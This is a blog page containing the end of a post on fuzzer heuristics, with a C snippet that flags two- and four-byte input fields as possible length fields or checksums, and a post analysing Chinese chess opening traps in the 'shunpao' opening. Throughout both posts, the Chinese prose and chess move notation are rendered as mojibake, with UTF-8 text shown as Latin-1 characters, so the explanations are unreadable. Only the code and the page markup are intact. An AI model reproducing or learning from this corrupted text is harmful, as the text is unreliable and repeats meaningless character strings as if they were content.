<p>â€‹		å¦åˆ™å¦‚æœè¯¥å­—æ®µçš„é¦–å­—èŠ‚æœ€é«˜ä½, ä¸ç­‰äºå…¶ä»–å­—èŠ‚ä¹‹ä¸€çš„é¦–å­—èŠ‚æœ€é«˜ä½, åˆ™è®¤ä¸ºè¯¥å­—æ®µæ˜¯ä¸€ä¸ªæ ¡éªŒå’Œ</p>
<p>â€‹	å…¶ä»–é•¿åº¦å°±ä¸å¾—è€ŒçŸ¥äº†</p>
<p>æ­¤éƒ¨åˆ†ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rtype == RESP_FIXED) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (rlen) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line"></span><br><span class="line">        u16 val = *(u16*)(in_data + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Small integers may be length fields. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (val &lt;= in_len || SWAP16(val) &lt;= in_len)) &#123;</span><br><span class="line">          rtype = RESP_LEN;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Uniform integers may be checksums. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; <span class="built_in">abs</span>(in_data[i] - in_data[i + <span class="number">1</span>]) &gt; <span class="number">32</span>) &#123;</span><br><span class="line">          rtype = RESP_CKSUM;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line"></span><br><span class="line">        u32 val = *(u32*)(in_data + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Small integers may be length fields. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (val &lt;= in_len || SWAP32(val) &lt;= in_len)) &#123;</span><br><span class="line">          rtype = RESP_LEN;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Uniform integers may be checksums. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp;&amp; (in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span> ||</span><br><span class="line">            in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">2</span>] &gt;&gt; <span class="number">7</span> ||</span><br><span class="line">            in_data[i] &gt;&gt; <span class="number">7</span> != in_data[i + <span class="number">3</span>] &gt;&gt; <span class="number">7</span>)) &#123;</span><br><span class="line">          rtype = RESP_CKSUM;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span> ... MAX_AUTO_EXTRA - <span class="number">1</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>: rtype = RESP_SUSPECT;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/%E7%96%91%E5%BD%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%E7%96%91%E5%BD%A2/" class="post-title-link" itemprop="url">ç–‘å½¢ä¸æ”»å‡»</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-04-22 13:10:00" itemprop="dateCreated datePublished" datetime="2025-04-22T13:10:00+08:00">2025-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-05-02 04:14:28" itemprop="dateModified" datetime="2025-05-02T04:14:28+08:00">2025-05-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ç–‘å½¢ä¸æ”»å‡»"><a href="#ç–‘å½¢ä¸æ”»å‡»" class="headerlink" title="ç–‘å½¢ä¸æ”»å‡»"></a>ç–‘å½¢ä¸æ”»å‡»</h1><h2 id="é¡ºç‚®"><a href="#é¡ºç‚®" class="headerlink" title="é¡ºç‚®"></a>é¡ºç‚®</h2><h3 id="ç–‘å½¢"><a href="#ç–‘å½¢" class="headerlink" title="ç–‘å½¢"></a>ç–‘å½¢</h3><h4 id="ç¬¬1å±€-å½“å¤´æ£’å–-âœ¨"><a href="#ç¬¬1å±€-å½“å¤´æ£’å–-âœ¨" class="headerlink" title="ç¬¬1å±€ å½“å¤´æ£’å– âœ¨"></a>ç¬¬1å±€ å½“å¤´æ£’å– âœ¨</h4><p>æ£’æ§Œç‹</p>
<p>é¡ºç‚®æ¨ªè½¦å¯¹ç›´è½¦å·¡æ²³å±€é¢ä¸‹, çº¢å·¦é©¬è·³æ­£, å‹¾å¼•é»‘è½¦8å¹³3æ€å…µå‹é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308180644393.png" alt="image-20250308180644393"></p>
<p>çº¢æ–¹è¿éš¾è€Œä¸ŠæŒºèµ·ä¸ƒå…µç„¶åå·¦é©¬ç›˜æ²³, ç„¶åé£è±¡é©±è½¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308181307486.png" alt="image-20250308181307486"></p>
<p>æ­¤å±€é¢ä¸‹é»‘è½¦åªæœ‰ä¸‰ä¸ªå»å¤„, ç„¶è€Œéƒ½ä¸æ˜¯å¥½åœ°æ–¹, æˆ–è€…è¿›ç‚®å¡è±¡çœ¼</p>
<p>å¦‚æœé»‘è¿›ç‚®å¡è±¡è…°åˆ™çº¢æ–¹è¿›è½¦æŠ“ç‚®</p>
<h4 id="ç¬¬2å±€-è¾¹é©¬ç¦»å¿ƒ"><a href="#ç¬¬2å±€-è¾¹é©¬ç¦»å¿ƒ" class="headerlink" title="ç¬¬2å±€ è¾¹é©¬ç¦»å¿ƒ"></a>ç¬¬2å±€ è¾¹é©¬ç¦»å¿ƒ</h4><p>æ€ğŸç‹</p>
<p>é¡ºç‚®æ¨ªè½¦å¯¹ç›´è½¦ å±€é¢ä¸‹ é»‘æ–¹å³é©¬å±¯è¾¹ï¼Œï¼Œæ­¤æ—¶çº¢æ–¹ç«‹åˆ»è½¦å…­è¿›å…­æ‰ç‚®è¿›è¡Œåˆ©ç”¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032248959.png" alt="image-20250322032248959"></p>
<p>è¿›è½¦ä¸€æŠ“é»‘ç‚®å·¡æ²³ï¼Œå†é€€è½¦ä¸€æŠ“ï¼Œé»‘å…µ1è¿›1ç”¨é©¬ç»™ç‚®ç”Ÿæ ¹ï¼Œæ­¤æ—¶çº¢è·³æ­£é©¬å‹¾å¼•é»‘ç‚®æ¥æ‰“ï¼Œå®é™…ä¸Šæ˜¯å‹¾å¼•é»‘ç‚®è®©å¼€2è·¯ï¼Œçº¢ä¹˜æœºè¿›ç‚®æ‰“é©¬ç„¶åä¸­ç‚®å‘å°„ï¼Œåé¢ä¼ºæœºåšé“é—¨æ “</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032500109.png" alt="image-20250322032500109"></p>
<p>èµ°åˆ°è¿™ä¸ªå±€é¢é»‘æ–¹åŸºæœ¬æ— äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032734487.png" alt="image-20250322032734487"></p>
<p>èµ°åˆ°è¿™ä¸ªå±€é¢å·²ç»ç»æ€äº†ï¼Œè¿™ä¸ªé“é—¨æ “æ€æ³•å¯ä»¥è®°ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322032955500.png" alt="image-20250322032955500"></p>
<h4 id="ç¬¬3å±€-å…µå›¢å¤§æˆ˜"><a href="#ç¬¬3å±€-å…µå›¢å¤§æˆ˜" class="headerlink" title="ç¬¬3å±€ å…µå›¢å¤§æˆ˜"></a>ç¬¬3å±€ å…µå›¢å¤§æˆ˜</h4><p>ä¼˜åŠ¿åœ¨æˆ‘ç‹</p>
<p>é¡ºç‚®æ¨ªè½¦å¯¹ç›´è½¦å±€é¢ä¸‹ï¼Œé»‘æ–¹é€†å¤©è¡¥å£«ï¼Œçº¢æ–¹ç«‹åˆ»è½¦å…­è¿›ä¸ƒï¼Œå‡†å¤‡å¹³äºŒåƒæ­»é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322033451675.png" alt="image-20250322033451675"></p>
<p>å¦‚æœé»‘è·³æ­£é©¬åˆ™å¹³è½¦æŠ ï¼Œå°å¿ƒé»‘å·¡æ²³ç‚®å€’é’©æ‰“è½¦åŒæ—¶æ‰“åº•è±¡æŠ½è½¦ï¼Œå†²ä¸ƒå…µé˜²ä½å³å¯ï¼Œä¸‹é¢3é©¬æŠ çˆ½äº†åé¢å¥—ä¸Šå·¦ç‚®ç‹ ç‹ æ‰“ï¼Œä¼ºæœºè½¦ä¸ƒå¹³ä¸‰æŠ 7é©¬ï¼Œä¸Šä¸‹å…¶æ‰‹</p>
<p>å¦‚æœé»‘é©¬å±¯è¾¹åˆ™çº¢è¿›æ”»çŸ›å¤´æŒ‡å‘é»‘1è·¯ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322034009296.png" alt="image-20250322034009296"></p>
<p>è¿™é‡Œç©ºå¤´å¯ä»¥ç»™ï¼Œé»‘æ–¹ä¸€æ—¶åŠä¼šå„¿ä¸èƒ½é‡ç‚®ï¼Œçº¢ä¸‰é©¬è¿˜åœ¨é˜²å®ˆ</p>
<h4 id="ç¬¬4å±€-æ”»åŸç•¥åœ°"><a href="#ç¬¬4å±€-æ”»åŸç•¥åœ°" class="headerlink" title="ç¬¬4å±€ æ”»åŸç•¥åœ°"></a>ç¬¬4å±€ æ”»åŸç•¥åœ°</h4><p>æ”»ç•¥ç‹</p>
<p>åœ¨å½“å‰å±€é¢ä¸‹, çº¢æ–¹é©¬ä¸Šè½¦æ€å’å‹é©¬, é»‘æ–¹æœ‰ä¸¤ç§åº”æ³•, ä¸€æ˜¯é£è¾¹è±¡å‡ºè±¡ä½è½¦çœ‹é©¬æ¶ˆæé˜²å¾¡, äºŒæ˜¯å·¡æ²³ç‚®å¼¹æ€§é˜²å¾¡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305150405582.png" alt="image-20250305150405582"></p>
<h5 id="é»‘å·¡æ²³ç‚®å¼¹æ€§é˜²å¾¡"><a href="#é»‘å·¡æ²³ç‚®å¼¹æ€§é˜²å¾¡" class="headerlink" title="é»‘å·¡æ²³ç‚®å¼¹æ€§é˜²å¾¡"></a>é»‘å·¡æ²³ç‚®å¼¹æ€§é˜²å¾¡</h5><p>å‡è®¾çº¢è½¦æ€å…µå‹é©¬, æ­¤æ—¶é»‘ç‚®è²Œä¼¼å¯ä»¥å¹³3,æ„å›¾å¦‚æœçº¢è½¦æ€é©¬, åˆ™é»‘ç‚®æ‰“é©¬å€’å‹¾æ‰“è½¦åŒæ—¶æ‰“å¦ä¸€åŒ¹é©¬. ä½†æ˜¯çº¢å¯ä»¥é©¬ä¸ƒé€€äº”è¿åˆƒè€Œè§£, åŒæ—¶é»‘3é©¬è¿˜æ˜¯è¢«å‹, é»‘éœ€è¦å†èµ°ä¸€ä¸ªé«˜è½¦ä¿é©¬, æ­¤æ—¶çº¢å°±å¯ä»¥å†²å…µæ‹±ç‚®äº†, é»‘ç‚®ç«‹ä¸ä½</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305151119031.png" alt="å¹³ç‚®æ‰“é©¬æ˜¯å‡æ£‹"></p>
<p>é»‘æ­£ç¡®èµ°æ³•æ˜¯é«˜è½¦ä¿é©¬, æ­¤æ—¶çº¢æ–¹éœ€è¦æŒºèµ·ä¸ƒå…µé˜²æ­¢é»‘ç‚®2å¹³3ç„ç€é©¬å’Œåº•è±¡.</p>
<p>æ­¤æ—¶é»‘æ–¹æœ‰æ²¿æ²³åå…«æ‰“å’Œé€€ç‚®æ‰“è½¦ä¸¤ç§æ‰‹æ®µ, æ²¿æ²³åå…«æ‰“ä¾ç„¶è§£å†³ä¸äº†3é©¬è¢«å‹çš„é—®é¢˜.å› æ­¤é€€ç‚®åå‡».</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305152517255.png" alt="image-20250305152517255"></p>
<p>å‡è®¾çº¢æ–¹æ²¡æœ‰æ€å…µå‹é©¬, è€Œæ˜¯å…ˆæŒºä¸ƒå…µ, ç›®çš„æ˜¯é˜²æ­¢é»‘ç‚®2å¹³3.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305152903688.png" alt="image-20250305152903688"></p>
<p>é‚£ä¹ˆæ­¤æ—¶é»‘æ–¹å°±å¯ä»¥æœ‰ä¸ªæƒ³æ³•: é€šè¿‡å…‘3å’å°†8è·¯è½¦è°ƒåˆ°3è·¯é˜²æ­¢å‹é©¬, åŒæ—¶åœ¨å³ç¿¼é›†ç»“äº†å…µåŠ›</p>
<p>ä½†æ˜¯ç›´æ¥å†²3å’çº¢æ–¹ä¸ä¼šç«‹åˆ»å…‘å…µ, è€Œæ˜¯è½¦å…­å¹³ä¸ƒå…ˆå‹é©¬,ä¸ç®¡è¿™ä¸ªå’</p>
<p>å› æ­¤é»‘æ–¹éœ€è¦å…ˆåŠäº›æ‰‹ç»­:</p>
<p>ç‚®2å¹³7, æ‰“é©¬</p>
<p>é©¬ä¸ƒè¿›å…«, å°è½¦åŒæ—¶ä¿é©¬</p>
<p>å’3è¿›1, çº¢æ–¹å¿…é¡»å¾—å…‘å…µ, å¦åˆ™å¦‚æœè¿˜å¹³è½¦å‹é©¬åˆ™é»‘ç»§ç»­å†²å’, æŠ“çº¢å…«è·¯é©¬ ,å¦‚æœçº¢è½¦æ€å…µåˆ™é»‘é©¬å‹ä¸ä½äº†, å¦‚æœçº¢è½¦æ€é©¬åˆ™é»‘å’æ€é©¬, é»‘å¤šä¸€ä¸ªè¿‡æ²³å…µ</p>
<p>å…µä¸ƒè¿›ä¸€, ç‚®7è¿›3 </p>
<p>ç‚®å…«å¹³ä¸‰, è½¦8å¹³3</p>
<p>åˆ°æ­¤é»‘æ–¹è§£å†³äº†3é©¬è¢«å‹çš„é—®é¢˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305153730590.png" alt="image-20250305153730590"></p>
<h5 id="é»‘é£è¾¹è±¡æ¶ˆæé˜²å¾¡"><a href="#é»‘é£è¾¹è±¡æ¶ˆæé˜²å¾¡" class="headerlink" title="é»‘é£è¾¹è±¡æ¶ˆæé˜²å¾¡"></a>é»‘é£è¾¹è±¡æ¶ˆæé˜²å¾¡</h5><p>æ­¤å±€é¢ä¸‹çº¢æ–¹å¾ˆå¯èƒ½ç›´æ¥å°±è½¦æ€å…µå‹é©¬äº†, æ¯•ç«Ÿéš¾ä»¥æŠµæŒ¡è¿™ä¸ªè¯±æƒ‘</p>
<p>é»‘å‡ºè±¡ä½è½¦ä¿é©¬, æ­¤æ—¶çº¢æŠ¬å·¡æ²³ç‚®, æ„å›¾å¥—åœ¨è½¦åç‹ ç‹ æ‰“é©¬, ä½†æ˜¯æ…¢ä¸€æ­¥, é»‘é©¬é€€çªå¿ƒåŒæ—¶ä»¥æš—è½¦å…‘çº¢æ˜è½¦, çº¢æ–¹å°±æ²¡æœ‰æ”»åŠ¿äº†å¹¶ä¸”é»‘æ–¹è½¦æ›´æ˜, åå…ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305165104913.png" alt="image-20250305165104913"></p>
<p>çº¢æ­£ç¡®èµ°æ³•åº”è¯¥å…ˆæŠ¬ç‚®, ä¿ç•™å‹é©¬çš„å˜åŒ–, å¹¶ä¸”å·¡æ²³ç‚®æœ‰å¤šä¸ªæ‰“å‡»ç‚¹ä½, ä½¿å¾—é»‘æ–¹é¡¾æ­¤å¤±å½¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305165957909.png" alt="image-20250305165957909"></p>
<p>çº¢æ–¹å·¡æ²³ç‚®å¯¹é»‘çš„æœ€å¤§å¨èƒå°±æ˜¯3é©¬, ä¸‹ä¸€æ­¥çº¢å°±è¦å¹³è½¦å‹é©¬, éå¸¸ä¸¥å‰, å› æ­¤é»‘æ–¹å¿…é¡»é¦–å…ˆé˜²å¤‡3é©¬</p>
<p>å¦‚æœé»‘å¹³è½¦åˆ°3è·¯å°†ä¼šè¢«åˆ©ç”¨:</p>
<p>ç‚®å…«å¹³äºŒ, é©¬7é€€5</p>
<p>å…µä¸ƒè¿›ä¸€, è½¦3è¿›1</p>
<p>é©¬ä¸ƒè¿›å…­ , è½¦ç»™é©¬ç”Ÿæ ¹åé¢å¥—ç€ç‚®æ‰“é»‘è½¦, çº¢æ–¹ç›´æ¥å°±çˆ½é«˜æ½®äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305170320106.png" alt="image-20250305170320106"></p>
<p>å› æ­¤åªèƒ½å†²3å’åº”å¯¹</p>
<h4 id="ç¬¬5å±€-é¿å®å‡»è™š"><a href="#ç¬¬5å±€-é¿å®å‡»è™š" class="headerlink" title="ç¬¬5å±€ é¿å®å‡»è™š"></a>ç¬¬5å±€ é¿å®å‡»è™š</h4><p>å‡åŠ¨ä½œç‹</p>
<p>åœ¨å½“å‰å±€é¢ä¸‹, é»‘æ–¹é£èµ·è¾¹è±¡, ç›®çš„æ˜¯åº”å¯¹çº¢æ–¹è½¦å…­è¿›äº”ç„¶åå¹³ä¸‰å‹é©¬, é»‘æ–¹å¯ä»¥è±¡ä½è½¦çœ‹é©¬</p>
<p>ä½†æ˜¯è±¡é£çš„å¤ªæ—©äº†, ç­‰çº¢è½¦å…­è¿›äº”æ—¶å†é£ä¹Ÿä¸è¿Ÿ, æ­¤æ—¶é£å¯èƒ½æ˜¯ä¸ºäº†ä¿ä½ä¸‰å’ ,ä½†æ˜¯ä¹Ÿå‰Šå¼±äº†é˜²å¾¡, è”è±¡å›°éš¾</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305144553845.png" alt="image-20250305144553845"></p>
<p>é‚£ä¹ˆçº¢æ–¹å°±ä¸è¦å†è¿›è½¦å‹é©¬äº†, é»‘æ–¹ä¸ç®¡ä»å¿ƒç†ä¸Šè¿˜æ˜¯é˜µå‹ä¸Šéƒ½å·²æœ‰äº†é˜²å¤‡, æ­¤åæˆ˜ç•¥ä¸Šçº¢æ–¹å°†è¿›æ”»çŸ›å¤´è½¬å‘é»‘æ–¹å·¦ä¾§</p>
<h4 id="ç¬¬6å±€-æ›²å¾„é€šå¹½"><a href="#ç¬¬6å±€-æ›²å¾„é€šå¹½" class="headerlink" title="ç¬¬6å±€ æ›²å¾„é€šå¹½"></a>ç¬¬6å±€ æ›²å¾„é€šå¹½</h4><p>é€šå¹½ç‹</p>
<p>åœ¨æ­¤å±€é¢ä¸‹, é»‘è½¦ç‚¹å…µæ—ä¼å›¾æ€å…µå‹é©¬, </p>
<p>é€€ç‚®æ‰“è½¦ä¸æˆç«‹, çº¢æ–¹æ¥ä¸åŠå¥—ç‚®æ‰“è½¦</p>
<p>å¹³ä¸­ç‚®è¡¥è±¡ç»™é©¬ç”Ÿæ ¹å¤ªæ†‹å±ˆäº†, ç›¸å½“äºç‚®äºŒå¹³äº”åˆç‚®äº”å¹³å››æµªè´¹äº†ä¸€æ­¥æ£‹ ,é»‘æ–¹åå…ˆ</p>
<p>ä¸Šé©¬è¹¬è½¦æ­£ç¡®, å¼•è¯±é»‘æ€å…µå‹é©¬, ç„¶åçº¢é©¬é€€çªå¿ƒ, ä¼ºæœºä»å³ä¾§è·³å‡º, å¹¶ä¸”ä¹Ÿä¸æ€•é»‘æ–¹å½“å¤´ç‚®, çº¢æ²³å£é©¬å¯ä»¥éšæ—¶é©¬å››è¿›å…­å…‘æ¢ä¸­ç‚®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250305143238353.png" alt="image-20250305143238353"></p>
<h4 id="ç¬¬7å±€-ä¸€ç®­ä¸‰é›•"><a href="#ç¬¬7å±€-ä¸€ç®­ä¸‰é›•" class="headerlink" title="ç¬¬7å±€ ä¸€ç®­ä¸‰é›•"></a>ç¬¬7å±€ ä¸€ç®­ä¸‰é›•</h4><p>ç®­é›•ç‹</p>
<p>é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ äº’è¿›ä¸‰å…µ ä¹‹å, çº¢è¿›è½¦éª‘æ²³æ‰é»‘3å’, åœ¨æ­¤å±€é¢ä¸‹, é»‘æ–¹æœ‰å‡ ç§åº”å¯¹æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308172332634.png" alt="image-20250308172332634"></p>
<p>1é€€çªå¿ƒç‚®, è®¾é™·é˜±è¯±æ€çº¢è½¦ ,çº¢æ–¹ä¸Šå½“é»‘æ–¹è¡€èµš ,çº¢æ–¹ä¸ä¸Šå½“é»‘æ–¹ä¹Ÿä¸äº</p>
<p>2ä¸Šæ­£é©¬, æ— è§†çº¢æ–¹, æ­¤åè½¦4è¿›1ä¿é©¬ç„¶åé€€ç‚®æ‰“è½¦åå‡», è¿˜æ˜¯éœ€è¦é«˜è½¦ä¿é©¬, æœ‰ç‚¹å§”å±ˆ</p>
<p>3é£è¾¹è±¡, æ­»æ¿é˜²å®ˆ ,ç­‰ç€æŒ¨æ‰“å°±å®Œäº†</p>
<p>æœ¬å±€å°±é’ˆå¯¹é»‘æ–¹é£è¾¹è±¡å±•å¼€æ‰“å‡»</p>
<p>çº¢å·¦ç‚®å¹³è¾¹, éšæ—¶å‘å°„, æ‰“è½¦æ˜¯å…ˆæ‰‹, å¹¶ä¸”å†æ‰“7å’å¨èƒæ‰“åº•è±¡åˆæ˜¯å…ˆæ‰‹, </p>
<p>å¹³è¾¹ç‚®åçº¢å·¦è½¦ä¹Ÿå¯ä»¥éšæ—¶å¼€å‡º, å‹åˆ¶é»‘æ–¹å³ä¾§é©¬ç‚®, </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308173125233.png" alt="image-20250308173125233"></p>
<h4 id="ç¬¬8å±€-å¶åº•è—èŠ±"><a href="#ç¬¬8å±€-å¶åº•è—èŠ±" class="headerlink" title="ç¬¬8å±€ å¶åº•è—èŠ±"></a>ç¬¬8å±€ å¶åº•è—èŠ±</h4><p>è—èŠ±ç‹</p>
<p>åœ¨é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ - ä¸¤å¤´è›‡å¯¹åŒæ¨ªè½¦å±€é¢ä¸‹,</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308173837780.png" alt="image-20250308173837780"></p>
<p>æ­¤å±€é¢ä¸‹çº¢æ–¹å·¦ç‚®å·¡æ²³, å…¶ç›®çš„æ˜¯æ©æŠ¤å·¦é©¬ç›˜æ²³, å†å¥—ç‚®æ‰“è½¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308174856559.png" alt="image-20250308174856559"></p>
<p>æ­¤æ—¶é»‘æ–¹çš„åå‡»é‡ç‚¹æ˜¯çº¢ä¸ƒè·¯, è½¦1å¹³3è—äºé©¬å, å¦‚å¶åº•è—èŠ±</p>
<p>æ­¤åå¦‚æœçº¢å·¦é©¬ç›˜æ²³åˆ™é»‘æŒº3å’ç ´åçº¢æ–¹æ²³å£é˜µåœ°, é»‘æ–¹ä¸å®³æ€•çº¢æ–¹å¥—åç‚®æ‰“è½¦, å› ä¸ºé»‘æ–¹ä¹Ÿå¯å¹³ç‚®æŒ¡åœ¨è½¦å‰, å¹¶ä¸”æœ‰ç‚®æ‰“åº•å£«åŒæ—¶è½¦æ‰ç‚®çš„æ‰‹æ®µ. </p>
<p>åŸºäºè¿™ä¸ªè€ƒè™‘, å¦‚æœçº¢å…ˆè½¦ä¹è¿›äºŒ, ç»™å¾…ä¼šå„¿åç‚®ç”Ÿæ ¹, é‚£ä¹ˆé»‘å¿…é¡»ç«‹åˆ»è¿›ä¸­å…µä»ä¸­è·¯çªç ´, å¦‚æœåé¢çº¢æ–¹è¿˜è¦å¸ä¸­ç‚®å¥—åœ¨é©¬åæ‰“è½¦, é‚£ä¹ˆçº¢æ–¹ä¸­è·¯å°†æ›´åŠ è–„å¼±, æ­¤æ—¶é»‘æ–¹åº”è¯¥ç»§ç»­è´¯å½»ä¸­è·¯çªç ´çš„æˆ˜ç•¥, å“ªæ€•ä¸€è½¦æ¢äºŒåŒæ—¶ä¿æŒæ”»åŠ¿.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250308175722869.png" alt="image-20250308175722869"></p>
<p>çº¢æ–¹å·¦é©¬ç›˜æ²³ååº”è¯¥ç«‹åˆ»è¿›3å’ç ´åçº¢æ–¹æ²³å£é˜µåœ°, é€¼è¿«çº¢æ–¹å¥—ç‚®æˆ–è€…ç»§ç»­è¿›é©¬è¡¨æ€</p>
<p>ç»§ç»­è¿›é©¬, é»‘æ–¹åªéœ€è¦ç»§ç»­å†²3å’è¿‡æ²³,ç®€å•å¾—å¾ˆ</p>
<p>å¥—åç‚®åˆ™é»‘æ–¹ç›´æ¥å¼ƒè½¦ç»§ç»­å†²ä¸­å’</p>
<h4 id="ç¬¬9å±€-åˆšæŸ”å¹¶æµ"><a href="#ç¬¬9å±€-åˆšæŸ”å¹¶æµ" class="headerlink" title="ç¬¬9å±€ åˆšæŸ”å¹¶æµ"></a>ç¬¬9å±€ åˆšæŸ”å¹¶æµ</h4><p>åŒç®¡ç‹</p>
<p>åœ¨é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ - çº¢ä¸¤å¤´è›‡å±€é¢ä¸‹ ï¼Œé»‘æ–¹çš„æœ€ä½³åº”ç€æ˜¯åŒæ¨ªè½¦ï¼Œ èµ°æˆé¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ - çº¢ä¸¤å¤´è›‡å¯¹é»‘åŒæ¨ªè½¦ å±€é¢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250322010229764.png" alt="image-20250322010229764"></p>
<p>ç„¶è€Œå¦‚æœé»‘æ²¡æœ‰æŠ¬åŒæ¨ªè½¦ï¼Œè€Œæ˜¯æ”¹èµ°ç‚®2å¹³1ï¼Œä¼å›¾å‡ºç›´è½¦ ï¼Œé‚£ä¹ˆå°±ç»™äº†çº¢å‡ºç›´è½¦çš„æœºä¼šï¼Œé»‘æ–¹å°†ä¼šé­åˆ°çº¢å·¦ç‚®å°è½¦ï¼Œå½¢æˆå¦‚å›¾æ‰€ç¤ºå±€é¢</p>
